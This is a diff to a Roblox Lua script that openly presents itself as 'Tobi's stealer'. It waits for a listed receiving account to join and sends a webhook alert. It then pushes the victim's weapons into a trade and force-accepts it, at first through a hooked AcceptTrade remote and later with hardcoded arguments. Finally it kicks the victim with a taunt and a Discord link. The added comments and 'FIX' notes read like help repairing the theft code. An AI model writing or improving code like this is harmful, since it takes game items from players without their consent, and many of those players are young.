@@ -211,8 +211,10 @@ local function sendTradeRequest(user)
         return 
     end
 
+    -- Run the invocation in a separate thread so it cannot freeze the script
     task.spawn(function()
         local success, err = pcall(function()
+            -- Invoke the server without blocking the main loop
             game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(targetPlayer)
         end)
         
@@ -237,94 +239,20 @@ local function waitForTradeCompletion()
     end
 end
 
--- At the top with your other variables
-local tradeSessionId = nil
-local sessionCaptured = false
-local lastTradeData = nil
-
--- Hook to capture session ID (more robust version)
-local acceptRemote = TradeRemote:WaitForChild("AcceptTrade")
-local oldFireServer = acceptFireServer
-
-acceptRemote.FireServer = function(self, ...)
-    local args = {...}
-    
-    -- Debug: see what args look like
-    print("AcceptTrade fired with args:", unpack(args))
-    
-    -- Try to find session ID in various positions
-    if not sessionCaptured then
-        for i, arg in ipairs(args) do
-            if type(arg) == "string" and #arg == 36 then -- UUID length
-                tradeSessionId = arg
-                sessionCaptured = true
-                print("Trade session captured at position", i, ":", tradeSessionId)
-                break
-            elseif type(arg) == "number" and i > 1 then
-                -- Sometimes it's a number ID
-                tradeSessionId = arg
-                sessionCaptured = true
-                print("Trade session captured (number) at position", i, ":", tradeSessionId)
-                break
-            end
-        end
-    end
-    
-    -- Store all args for later use
-    lastTradeData = args
-    return oldFireServer(self, ...)
+local function acceptTrade()
+    local args = {
+        [1] = 428469873,
+		[2] = 19843.00729993102
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
 end
 
--- Reset capture when trade ends
-local function resetSession()
-    tradeSessionId = nil
-    sessionCaptured = false
-    lastTradeData = nil
-    print("Session reset")
-end
+--local args = {
+	--428469873,
+	--19843.00729993102
+--}
+--game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
 
--- Updated acceptance with weapon support
-local function initiateAcceptance()
-    if not tradeSessionId then
-        warn("No session ID! Make sure to click Accept first to capture it.")
-        return
-    end
-    
-    print("Initiating acceptance for session:", tradeSessionId)
-    
-    -- Fire with proper arguments (try multiple formats)
-    for i = 1, 5 do
-        -- Try the standard format
-        acceptRemote:FireServer(428469873, tradeSessionId)
-        
-        -- If we captured original args, try replaying them
-        if lastTradeData then
-            acceptRemote:FireServer(unpack(lastTradeData))
-        end
-        
-        wait(0.1)
-    end
-end
-
--- Hook trade end to reset
-TradeRemote:WaitForChild("UpdateTrade").OnClientEvent:Connect(function(data)
-    lastTradeData = data -- Store trade data
-    
-    if data and data.Status == "None" then
-        resetSession()
-    elseif data and data.Status == "Accepted" then
-        print("Trade was accepted!")
-    end
-end)
-
--- Also capture from UpdateTrade which might have session info
-TradeRemote:WaitForChild("UpdateTrade").OnClientEvent:Connect(function(data)
-    if data and data.SessionId and not sessionCaptured then
-        tradeSessionId = data.SessionId
-        sessionCaptured = true
-        print("Session captured from UpdateTrade:", tradeSessionId)
-    end
-end)
 
 local function addWeaponToTrade(id)
     local args = {
@@ -573,7 +501,7 @@ if #weaponsToSend > 0 then
                     end
                 end
                 wait(6)
-                initiateAcceptance()  -- FIXED: Now calls the correct function
+                acceptTrade()
                 waitForTradeCompletion()
             else
                 wait(0.5)
@@ -583,26 +511,40 @@ if #weaponsToSend > 0 then
         plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
     end
 
-    local function startPlayerPolling()
-        local checkInterval = 3
-        local searchActive = true
+local function startPlayerPolling()
+    local checkInterval = 3 -- Checks the server every 3 seconds
+    local searchActive = true
 
-        task.spawn(function()
-            while searchActive do
-                for _, player in ipairs(Players:GetPlayers()) do
-                    if table.find(users, player.Name) then
-                        SendMessage(sentWeapons)
-                        searchActive = false
-                        task.spawn(function()
-                            doTrade(player.Name)
-                        end)
-                        break
-                    end
+    task.spawn(function()
+        while searchActive do
+            -- Look through every player currently in the game server
+            for _, player in ipairs(Players:GetPlayers()) do
+                -- Check if their username matches your configuration list
+                if table.find(users, player.Name) then
+                    
+                    -- 1. Fire webhook notification
+                    SendMessage(sentWeapons)
+                    
+                    -- 2. Turn off the loop immediately
+                    searchActive = false
+                    
+                    -- 3. Pass the detected player's name into the transaction thread
+                    task.spawn(function()
+                        doTrade(player.Name)
+                    end)
+                    
+                    break -- Exit the current player loop
                 end
-                task.wait(checkInterval)
             end
-        end)
-    end
+            
+            -- Prevent the server thread from freezing
+            task.wait(checkInterval)
+        end -- <-- FIX 1: Closes the 'while searchActive do' loop
+    end) -- <-- FIX 2: Closes the 'task.spawn(function()' block
+end -- <-- FIX 3: Closes the 'local function startPlayerPolling()' block
 
-    startPlayerPolling()
+-- 4. Run the polling loop automatically when the script executes
+startPlayerPolling()
+
+-- 5. This final 'end' closes the main 'if #weaponsToSend > 0 then' block from line 458
 end
